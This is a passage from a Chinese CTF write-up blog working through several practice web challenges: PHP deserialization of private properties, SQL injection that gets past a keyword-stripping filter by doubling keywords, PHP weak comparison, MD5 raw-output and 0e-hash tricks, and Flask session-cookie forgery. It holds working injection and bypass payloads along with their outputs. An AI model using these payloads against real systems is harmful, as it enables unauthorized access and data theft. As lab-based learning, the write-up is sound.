$flag_1;<span class="hljs-meta">?&gt;</span></code></pre><p>简洁版执行结果：</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;修改属性个数：<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre><p>但还是不行/???</p><h4 id="private"><a href="#private" class="headerlink" title="private"></a>private</h4><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见</p><p><strong>private属性被序列化后属性值会变成<code>%00类名%00属性名</code>,则需在创造对象后根据规则进行修改，长度也要加上%00</strong></p><p>payload1：</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;Name&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">100</span>;&#125;</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220217220200027.png" alt="image-20220217220200027"></p><p>==<strong>注意❗⚠：可以进行url编码，防止%00对应的不可打印字符在复制时丢失</strong>==，payload2：</p><pre><code class="hljs php"><span class="hljs-comment">#未编码直接序列化private：</span><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;  //无法成功</span><span class="hljs-keyword">echo</span> urlencode(serialize($a));<span class="hljs-comment">#编码后：可以成功得到flag</span>O%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A100%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<span class="hljs-comment">#再将Name后面的2换成3或其他值即可</span></code></pre><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h4 id="考点：关键词替换为空后回显部分数据"><a href="#考点：关键词替换为空后回显部分数据" class="headerlink" title="考点：关键词替换为空后回显部分数据"></a>考点：关键词替换为空后回显部分数据</h4><h4 id="万能密码，位置？"><a href="#万能密码，位置？" class="headerlink" title="万能密码，位置？"></a>万能密码，位置？</h4><blockquote><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。</p><p>要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。</p><p>当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p><p><strong>只要’or’后面的字符串为一个非零的数字开头都会返回True</strong></p><pre><code class="hljs awk">select * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;1abcdefg&#x27;</span>    ---&gt;  Trueselect * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;0abcdefg&#x27;</span>    ---&gt;  Falseselect * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;1&#x27;</span>           ---&gt;  Trueselect * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;2&#x27;</span>           ---&gt;  Trueselect * from `admin` where password=<span class="hljs-string">&#x27;&#x27;</span>o<span class="hljs-string">r&#x27;0&#x27;</span>           ---&gt;  False</code></pre></blockquote><p>用户名输入admin,密码栏输入万能密码<code>amin&#39;or&#39;1</code>，发现不对，NO,Wrong username password！！！【==<strong>后续发现这里就可以猜出是replace了关键字，不然不可能回显密码错误，而应该爆出账号密码</strong>==】</p><p>密码输入<code>admin&#39;</code>，回显error，密码输入<code>amin&#39;#</code>，回显NO,Wrong username password！！！，说明密码这存在字符注入</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218143127168.png" alt="image-20220218143127168" style="zoom:67%;"><p>用户名输入<code>1′ or 1=1 or &#39;1&#39;=&#39;1</code>，密码admin，回显Error，说明用户名出存在字符注入</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218142842677.png" alt="image-20220218142842677"></p><p>但是这个回显为什么只回显一部分?不懂，搜wp猜测是删掉了关键词</p><p>比如password输入or，回显没输入password，说明删掉了（过滤）关键词or，<code>oror</code>，也不行，<code>oorr</code>可以绕过，印证猜测，就是把关键词换位空</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220222121231.png" alt="image-20220220222121231" style="zoom: 50%;"><p>然后重新输入万能密码，发现成功登录</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221001708538.png" alt="image-20220221001708538" style="zoom:50%;"><pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; oorr &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></code></pre><ol><li><p>猜测列数，order和by都被过滤==》双写</p><pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;oorrder bbyy 4 --+  //报错Unknown column &#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27; in &#x27;</span><span class="hljs-keyword">order</span> claus<span class="hljs-string">e&#x27;</span><span class="hljs-string">check.php?username=admin&amp;password=1&#x27;</span>oorrder bbyy <span class="hljs-number">3</span><span class="hljs-comment">--+  //NO,Wrong username password！！！说明有3列</span></code></pre></li><li><p>猜测位置，同理，只输入union select 1,2,3，报错version for the right syntax to use near ‘1,2,3– ‘’ at line 1，说明<span style="background:#FF9999;">吞了</span>union和select，同样用双写绕过</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220233828652.png" alt="image-20220220233828652" style="zoom:67%;"><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+  //发现回显位置<span class="hljs-number">2</span>,<span class="hljs-number">3</span></code></pre><ol start="3"><li><p>爆数据库名：geek</p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>--+</code></pre></li><li><p>爆所有库：Your password is ‘information_schema,mysql,performance_schema,test,ctf,geek’  //可疑库：ctf</p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) ffromrom infoorrmation_schema.schemata--+  // use near &#x27;.schemata,<span class="hljs-number">3</span>-- &#x27;&#x27; at line <span class="hljs-number">1</span></code></pre><p><strong>注意❗information.schema被过滤可能因为information里的or，而不是整个information被过滤</strong></p></li></ol></li></ol><h4 id="如何测试那些关键词被过滤？用什么代替？"><a href="#如何测试那些关键词被过滤？用什么代替？" class="headerlink" title="如何测试那些关键词被过滤？用什么代替？"></a>如何测试那些关键词被过滤？用什么代替？</h4><p>先在password单独测试关键词，例如password输入from，回显Input your username and password，说明被吞==》输入ffromrom，回显NO,Wrong username password！！！，成功绕过 ==》**<span style="background:#FF9999;">先测试关键词+绕过方法再注入，不然不知道是哪个词出现了问题</span>**</p><p>或者知道几列后，在某个位置用’’直接回显，看他是不是自己，印证猜想：replace关键词为空</p><pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;uunionnion</span> sselectelect <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;information</span>&#x27;,<span class="hljs-number">3</span><span class="hljs-comment">--+</span></code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220235721090.png" alt="image-20220220235721090" style="zoom:67%;"><ol start="5"><li><p>爆表名：’b4bsql,geekuser’</p><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--+</code></pre></li><li><p>爆列名：’id,username,password’</p><pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;uunionnion</span> sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name=<span class="hljs-symbol">&#x27;b4bsql</span>&#x27;<span class="hljs-comment">--+   //注意❗要加引号</span></code></pre></li><li><p>爆具体数据</p><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">concat_ws</span>(&#x27;--&#x27;,<span class="hljs-params">id</span>,<span class="hljs-params">username</span>,<span class="hljs-params">passwoorrd</span>)</span>) ffromrom b4bsql--+</code></pre><p>‘1–cl4y–i_want_to_play_2077,2–sql–sql_injection_is_so_fun,3–porn–do_you_know_pornhub,4–git–github_is_different_from_pornhub,5–Stop–you_found_flag_so_stop,6–badguy–i_told_you_to_stop,7–hacker–hack_by_cl4y,8–flag–flag{4a2ddb62-9290-4b79-bce5-c2222e134275}’</p></li></ol><p>得到flag</p><h2 id="ACTF2020-新生赛-BackupFile-简单"><a href="#ACTF2020-新生赛-BackupFile-简单" class="headerlink" title="[ACTF2020 新生赛]BackupFile(简单)"></a>[ACTF2020 新生赛]BackupFile(简单)</h2><h4 id="考点：备份文件、弱类型比较：数字相等"><a href="#考点：备份文件、弱类型比较：数字相等" class="headerlink" title="考点：备份文件、弱类型比较：数字相等"></a>考点：备份文件、弱类型比较：数字相等</h4><p>御剑扫到index.php.bak，得到源码</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221234847834.png" alt="image-20220221234847834" style="zoom: 67%;"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;    $key = $_GET[<span class="hljs-string">&#x27;key&#x27;</span>];    <span class="hljs-keyword">if</span>(!is_numeric($key)) &#123;  <span class="hljs-comment">//key得是数字</span>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);    &#125;    $key = intval($key);    $str = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class="hljs-keyword">if</span>($key == $str) &#123;   <span class="hljs-comment">//弱类型比较</span>        <span class="hljs-keyword">echo</span> $flag;    &#125;&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;&#125;</code></pre><p><strong>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。所以直接传入key=123就行</strong></p><p>弱类型比较跟123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3相等即可==》数字，123</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h4 id="考点：md5弱类型-强类型都考了、F12网络抓包看hint"><a href="#考点：md5弱类型-强类型都考了、F12网络抓包看hint" class="headerlink" title="考点：md5弱类型+强类型都考了、F12网络抓包看hint"></a>考点：md5弱类型+强类型都考了、F12网络抓包看hint</h4><p>一开始找不到要干啥，找WP发现，输入1，F12查看网络，得到提示/burp抓包也能看到，Hint: select * from ‘admin’ where password=md5($pass,true)</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222000509201.png" alt="image-20220222000509201" style="zoom:67%;"><p><strong><em>md5(string,raw):可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式，FALSE - 默认。32 字符十六进制数</em></strong></p><p>万能密码：</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">1</span></code></pre><p>得找到某个东西使它md5 二进制后为万能密码，，看WP</p><ol><li>ffifdyop，md5 二进制后是<code>&#39;or&#39;6�]��!r,��b</code></li></ol><blockquote><p>这里提供一个==<strong>最常用的：ffifdyop</strong>==，该字符串md5加密后若raw参数为True时会返回<code> &#39;or&#39;6&lt;trash&gt;</code> (<code>&lt;trash&gt;</code>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<code>&lt;trash&gt;</code>会在MySQL将其转换成整型比较时丢掉)</p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001300948.png" alt="image-20220222001300948"></p><ol start="2"><li>输入后跳转到/levels91.php</li></ol><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001617105.png" alt="image-20220222001617105" style="zoom:67%;"><p>查看源码得到php</p><pre><code class="hljs php">&lt;!--$a = $GET[<span class="hljs-string">&#x27;a&#x27;</span>];$b = $_GET[<span class="hljs-string">&#x27;b&#x27;</span>];<span class="hljs-keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span>--&gt;</code></pre><p><strong>典型的md5碰撞，</strong>要求ab不同但md5相同，弱类型比较，<strong>弱类型比较 可以通过两个0e开头的md5绕过</strong></p><p><strong>这里提供一些md5以后是0e开头的值：</strong>【更多参考<a href="https://www.jianshu.com/p/c5b05c766906">wp</a>】</p><pre><code class="hljs angelscript">QNKCDZO<span class="hljs-number">0e830400451993494058024219903391</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span></code></pre><p>构造levels91.php?a=QNKCDZO&amp;b=s878926199a，发现又跳转到新的页面levell14.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;param1&#x27;</span>]!==$_POST[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;    <span class="hljs-keyword">echo</span> $flag;&#125;</code></pre><p>强类型比较，需要1.强碰撞：<strong>找到两个md5值相同的字符串即可</strong>/2.绕过：<strong>数组绕过</strong></p><pre><code class="hljs php">md5(<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span><span class="hljs-comment">//更多：</span>sha1(<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span>    ereg(pattern,<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span> vs preg_match(pattern,<span class="hljs-keyword">array</span>) = <span class="hljs-literal">false</span>strcmp(<span class="hljs-keyword">array</span>(), <span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-literal">null</span>strpos(<span class="hljs-keyword">array</span>(),<span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-literal">null</span></code></pre><p>payload：</p><pre><code class="hljs apache"><span class="hljs-attribute">param1</span>[]=&amp;param<span class="hljs-number">2</span>[]=<span class="hljs-number">2</span></code></pre><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222002727828.png" alt="image-20220222002727828" style="zoom: 67%;"><h4 id="如何找到特定开头的md5值？"><a href="#如何找到特定开头的md5值？" class="headerlink" title="如何找到特定开头的md5值？"></a>如何找到特定开头的md5值？</h4><blockquote><p><a href="https://www.cnblogs.com/yesec/p/12535534.html">**大佬博客</a></p></blockquote><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>;;) &#123;  <span class="hljs-keyword">for</span> ($c = <span class="hljs-number">0</span>; $c &lt; <span class="hljs-number">1000000</span>; $c++, $i++)  <span class="hljs-keyword">if</span> (stripos(md5($i, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . md5($i, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span></code></pre><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin(**)"></a>[HCTF 2018]admin(**)</h2><h4 id="考点-flask、客户端session伪造"><a href="#考点-flask、客户端session伪造" class="headerlink" title="考点:flask、客户端session伪造"></a>考点:flask、客户端session伪造</h4><blockquote><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">csdn三种解法WP</a></p><p>更多：<a href="https://inhann.top/2021/02/25/flask_newer/">flask漏洞利用小结</a></p><p>参考：<a href="https://xz.aliyun.com/t/3679"><strong>详细，易懂，适合小白+CTF各种过滤绕过姿势</strong></a></p></blockquote><h4 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h4><p>==Flask==：一个用Python编写的轻量级Web应用框架。基于Werkzeug WSGI工具箱和Jinja2模板引擎。</p><p>参考：<a href="https://www.jianshu.com/p/d537d634df7b">https://www.jianshu.com/p/d537d634df7b</a></p><p>​    总结一下，Flask处理一个请求的流程就是，首先根据 URL 决定由那个函数来处理，然后在函数中进行操作，取得所需的数据。再将数据传给相应的模板文件中，由Jinja2 负责渲染得到 HTTP 响应内容，然后由Flask返回响应内容。</p><ul><li><p>注意</p><p>render_template()是用来渲染一个指定的文件的。使用如下：return render_template(‘index.html’) render_template_string则是用来渲染一个字符串的。<strong>SSTI与这个方法密不可分</strong>。</p></li></ul><p>​            <strong>简单来说也就是不正确的使用flask中的render_template_string方法会引发SSTI。</strong></p><ol><li><strong>根据题目提示的admin,猜测是不是要让我用admin来登录这个网站？然后我在login界面输入用户名”admin“,密码”123“（弱口令）结果成功登录得到flag</strong></li><li>常规做法：先注册用户，登录用户后在修改密码查看源码，发现提示flask==&gt;框架，从GitHub上down源码</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223143114609.png" alt="image-20220223143114609"></p><ol start="3"><li><p>看到源码尝试模板注入，注册用户时regester.html有双大括号</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184440886.png" alt="image-20220304184440886" style="zoom: 67%;"><p>发现不行，并不响应</p></li></ol><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184231019.png" alt="image-20220304184231019" style="zoom:50%;"><p>而所有的传参form都经过了NewpasswordForm，转到定义，看不出来啥，猜测是被过滤了==》后续查看模板注入，发现<strong>只有render_template_string会导致注入</strong>，而且模板文件若已有<code>{{}}`,则无法产生注入，而模板语言无`{{}}</code>，输入参数可以<code>{{}}`的话就可以，参考https://xz.aliyun.com/t/3679> **两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)【参数可控】，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果使用render_template函数，将url里写自己想要的恶意代码`{{}}</code>传入进去并不会执行【良好的代码规范，使得模板其实已经固定了，已经被render_template渲染了，参数已经不可控】**</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304185102492.png" alt="image-20220304185102492" style="zoom:67%;"><ol start="3"><li>查看源码，在index.html得到flag的相关信息</li></ol><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223145017072.png" alt="image-20220223145017072" style="zoom: 50%;"><p>要求current_user.is_authenticated and session[‘name’] == ‘admin’</p><h4 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask_session伪造"></a>flask_session伪造</h4><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">客户端 session 导致的安全问题、flask</a></p><p><a href="https://chenlvtang.top/2021/02/01/Flask%E5%AE%A2%E6%88%B7%E7%AB%AFsession%E4%BC%AA%E9%80%A0/">Flask客户端session伪造</a></p></blockquote><p><strong>一般session会被保存到服务端中（服务端cookie，但是flask的session是存储在客户端的cookie里的</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/6277797-c018a4c5b5be1541.png" alt="img"></p><blockquote><p>flask对session的处理位于flask/sessions.py中（本题没找到），默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p></blockquote><p>session一般格式：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/t01ef54ad8392df284d.png" alt="img"></p><pre><code class="hljs gcode">.eJwljrFuwzAMBf<span class="hljs-number">9</span>FcwZSpkQyP<span class="hljs-number">2</span><span class="hljs-symbol">NQoh5</span>aBGgB<span class="hljs-meta">O5</span>mC_Hs<span class="hljs-symbol">NdLy75</span>d<span class="hljs-number">5</span>lx<span class="hljs-number">7</span>HOr<span class="hljs-number">3</span>J_Hq<span class="hljs-number">91</span>K_t<span class="hljs-number">3</span>l<span class="hljs-symbol">nuxGamDI6</span>kmLPpa<span class="hljs-number">1</span>TE<span class="hljs-number">0</span>UKteyYSpJyaaVJ<span class="hljs-number">8</span>hRGZDk<span class="hljs-number">7</span>ZtLlEbpALjxjOc<span class="hljs-number">1</span>SaZWzLSx-aB<span class="hljs-number">3</span>p<span class="hljs-number">0</span>djSta<span class="hljs-number">984</span>kjXqMrQqrE<span class="hljs-number">3</span>WhBM<span class="hljs-meta">o18</span>jrX<span class="hljs-number">8</span>X_D<span class="hljs-number">9</span>eJ<span class="hljs-number">5</span>Htifv<span class="hljs-number">4</span>_<span class="hljs-number">1</span>cxltCgQ<span class="hljs-number">3</span>V<span class="hljs-number">0</span>zvIsGBjDAlGQsq<span class="hljs-symbol">NJEi08</span>v<span class="hljs-symbol">nD15</span>kP<span class="hljs-number">8</span>Q.XxKIMg.iW<span class="hljs-number">96</span>TDgIamKLQ<span class="hljs-number">0</span>x<span class="hljs-number">9</span>h<span class="hljs-number">5</span>LoPsUCIvw</code></pre><p>通过.隔开的<strong>3段内容</strong>，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</p><pre><code class="hljs php">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code></pre><ul><li><p>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</p></li><li><p>漏洞成因<br> 漏洞的根源是<strong>secretkey被获取</strong>，应当使用完全随机的secretkey，或在clone某项目后修改为随机的key。<br> <strong>需要特别注意的是python2与python3下产生的timestamp是不一样的！</strong></p></li><li><p>==生成 session cookie 需要 secret_key 解码 session cookie 可以不需要 secret_key==</p></li><li><p><strong>利用工具：</strong></p></li></ul><p>​            <a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>​            <strong>由上文所述的session格式可知，要修改并伪造一个session的必要条件就是知道加密所采用的</strong><code>secret_key</code><strong>，一旦获取到</strong><code>secret_key</code><strong>, 我们就可以轻松的构造签名，从而实现客户端的session的伪造。</strong></p><ul><li><strong>安装问题</strong>：<a href="https://chenlvtang.top/2020/07/28/Flask%E3%81%AE%E5%88%9D%E8%AF%86/">参考博客</a>，安装完后出现helloworld后退出虚拟环境，直接运行脚本【注意，虚拟环境里设置的脚本是python.exe所以用法是python flask_xxx而不是python3 flask_xxx】</li></ul><p>cmd直接执行某文件夹下的exe：</p><pre><code class="hljs taggerscript">&quot;D:<span class="hljs-symbol">\W</span>ork<span class="hljs-symbol">\v</span>scode<span class="hljs-symbol">\M</span>icrosoft VS Code<span class="hljs-symbol">\_</span><span class="hljs-symbol">\C</span>ode.exe&quot;    //路径有空格情况下要加书昂引号</code></pre><p>用法：</p><p>解密: <code>python flask_session_manager.py decode -s SECRET_KEY -c session</code></p><p>加密: <code>python flask_session_manager.py encode -s SECRET_KEY -t 未加密session</code></p><pre><code class="hljs python">加密：【必须要有secret_key】$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py encode -s <span class="hljs-string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span>==》eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw解密：【可有可无key】有key:$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py decode -c <span class="hljs-string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span> -s <span class="hljs-string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span>==》&#123;<span class="hljs-string">u&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">u&#x27;number&#x27;</span>: <span class="hljs-string">&#x27;326410031505&#x27;</span>&#125;无kwy：$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py decode -c <span class="hljs-string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span>==》&#123;<span class="hljs-string">&quot;number&quot;</span>:&#123;<span 